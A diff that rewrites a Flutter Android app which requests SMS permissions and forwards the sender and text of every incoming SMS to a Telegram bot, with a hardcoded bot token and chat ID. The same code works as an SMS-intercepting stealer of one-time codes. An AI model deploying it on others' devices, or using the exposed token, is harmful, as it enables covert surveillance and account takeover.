@@ -1,68 +1,51 @@
+cat > lib/main.dart << 'EOF'
 import 'package:flutter/material.dart';
 import 'package:another_telephony/telephony.dart';
 import 'package:http/http.dart' as http;
-import 'package:flutter_background_service/flutter_background_service.dart';
 
-const String TELEGRAM_TOKEN = 'ضع_التوكن_هنا';
-const String CHAT_ID = 'ضع_الشات_ايدي_هنا';
+const String TELEGRAM_TOKEN = '8427135968:AAElq23WG9wdwRz376fcXGe-5zl4ujtTWw8';
+const String CHAT_ID = '8427135968';
+
+final Telephony telephony = Telephony.instance;
 
 Future<void> sendToTelegram(String message) async {
-  final url = Uri.parse(
-    'https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage'
-  );
-  await http.post(url, body: {
-    'chat_id': CHAT_ID,
-    'text': message,
-  });
+  try {
+    final url = Uri.parse(
+      'https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage'
+    );
+    await http.post(url, body: {
+      'chat_id': CHAT_ID,
+      'text': message,
+    });
+  } catch (e) {
+    debugPrint('Telegram error: $e');
+  }
 }
 
 @pragma('vm:entry-point')
-void onBackgroundMessage(SmsMessage message) {
-  final text = '📱 SMS جديد\nمن: ${message.address}\nالرسالة: ${message.body}';
-  sendToTelegram(text);
-}
-
-@pragma('vm:entry-point')
-Future<void> onStart(ServiceInstance service) async {
-  final telephony = Telephony.instance;
-  telephony.listenIncomingSms(
-    onNewMessage: (SmsMessage message) {
-      final text = '📱 SMS جديد\nمن: ${message.address}\nالرسالة: ${message.body}';
-      sendToTelegram(text);
-    },
-    onBackgroundMessage: onBackgroundMessage,
-  );
-}
-
-Future<void> initService() async {
-  final service = FlutterBackgroundService();
-  await service.configure(
-    androidConfiguration: AndroidConfiguration(
-      onStart: onStart,
-      autoStart: true,
-      isForegroundMode: true,
-      notificationChannelId: 'sms_forwarder',
-      initialNotificationTitle: 'SMS Forwarder',
-      initialNotificationContent: 'يعمل في الخلفية...',
-    ),
-    iosConfiguration: IosConfiguration(autoStart: false),
-  );
-  await service.startService();
+void backgroundMessageHandler(SmsMessage message) async {
+  await sendToTelegram('📱 SMS جديد\nمن: ${message.address}\n${message.body}');
 }
 
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
-  await initService();
+
+  bool? granted = await telephony.requestPhoneAndSmsPermissions;
+
+  if (granted != null && granted) {
+    telephony.listenIncomingSms(
+      onNewMessage: (SmsMessage message) {
+        sendToTelegram('📱 SMS جديد\nمن: ${message.address}\n${message.body}');
+      },
+      onBackgroundMessage: backgroundMessageHandler,
+    );
+  }
+
   runApp(const MyApp());
 }
 
-class MyApp extends StatefulWidget {
+class MyApp extends StatelessWidget {
   const MyApp({super.key});
-  @override
-  State<MyApp> createState() => _MyAppState();
-}
-
-class _MyAppState extends State<MyApp> {
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
@@ -75,15 +58,21 @@ class _MyAppState extends State<MyApp> {
             children: [
               const Icon(Icons.sms, size: 80, color: Colors.greenAccent),
               const SizedBox(height: 20),
-              const Text('يعمل ✓', style: TextStyle(color: Colors.white, fontSize: 28, fontWeight: FontWeight.bold)),
+              const Text(
+                'SMS Forwarder',
+                style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold),
+              ),
               const SizedBox(height: 8),
-              const Text('SMS Forwarder', style: TextStyle(color: Colors.white54, fontSize: 16)),
+              const Text(
+                'يعمل في الخلفية ✓',
+                style: TextStyle(color: Colors.white54, fontSize: 16),
+              ),
               const SizedBox(height: 40),
               ElevatedButton.icon(
                 onPressed: () async {
-                  await sendToTelegram('✅ اختبار - التطبيق يعمل!');
+                  await sendToTelegram('✅ اختبار - التطبيق يعمل على Android 10!');
                   ScaffoldMessenger.of(context).showSnackBar(
-                    const SnackBar(content: Text('تم إرسال رسالة اختبار!')),
+                    const SnackBar(content: Text('تم الإرسال لـ Telegram!')),
                   );
                 },
                 icon: const Icon(Icons.send),
@@ -101,3 +90,4 @@ class _MyAppState extends State<MyApp> {
     );
   }
 }
+EOF
